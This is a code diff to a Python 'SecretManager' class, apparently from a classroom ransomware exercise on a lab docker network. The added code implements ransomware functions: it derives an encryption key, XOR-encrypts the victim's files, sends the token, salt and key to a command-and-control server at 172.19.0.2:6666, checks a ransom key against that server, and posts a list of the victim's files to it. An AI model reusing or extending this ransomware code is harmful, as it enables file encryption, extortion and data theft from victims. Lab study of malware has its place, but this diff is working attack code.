@@ -26,7 +26,6 @@ class SecretManager:
         self._token = None
 
         self._files_encrypted = {}
-        self.filter = "*.txt"
 
         self._log = logging.getLogger(self.__class__.__name__)
 
@@ -73,23 +72,20 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
         payload = {
             "token" : self.bin_to_b64(token),
             "salt"  : self.bin_to_b64(salt),
             "key"   : self.bin_to_b64(key)
         }
-        requests.post("http://172.19.0.2:6666/new", json=payload)
-        #sudo docker inspect ransomware-network
-    
-        return {}
+        requests.post("http://172.19.0.2:6666/new", json=payload)    
+
 
     def setup(self)->None:
 
         tokens = self.create()
 
-        key, salt = self.do_derivation(tokens["salt"], tokens["key"])
-        token = tokens["token"]
+        key, self._salt = self.do_derivation(tokens["salt"], tokens["key"])
+        self._token = tokens["token"]
         self._key = key
         #m = sha256()
         #m.update(token)
@@ -99,12 +95,12 @@ class SecretManager:
         os.makedirs(folder_token_name, exist_ok=True)
 
         with open(folder_token_name + "/token.bin", "wb") as f:
-            f.write(token)
+            f.write(self._token)
 
         with open(folder_token_name + "/salt.bin", "wb") as f:
-            f.write(salt)
+            f.write(self._salt)
 
-        self.post_new(salt, key, tokens["token"])
+        self.post_new(self._salt, key, tokens["token"])
 
         #################
         # Question 3 
@@ -118,28 +114,43 @@ class SecretManager:
         raise NotImplemented()
 
     def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+        # Get the token user
+        token = self.get_hex_token()
 
-    def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        # Create the payload for the request verification key
+        payload = {
+            "token": self.bin_to_b64(token), 
+            "key": self.bin_to_b64(candidate_key)
+            }
 
-    def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
+        response = requests.post("http://172.19.0.2:6666/key", json=payload)
+        resp = response.json()
+        
+        if resp["valide"]==1:
+            return True
+        else:
+            return False
 
-        return self._token.hex()
+    def set_key(self, key:bytes)->None:
+        self._key = key
+
+    def get_hex_token(self)->bytes:
+        token = ""
+        
+        with open("/root/token/token.bin", "rb") as f:
+            token = f.read()
+
+        return token 
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-
         for file in files:
             self._files_encrypted[str(file)] = xorfile(file, self._key)
         
         
     def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        payload = files
+        requests.post("http://172.19.0.2:6666/files", json=payload)    
+        return {}
 
     def clean(self):
         # remove crypto data from the target
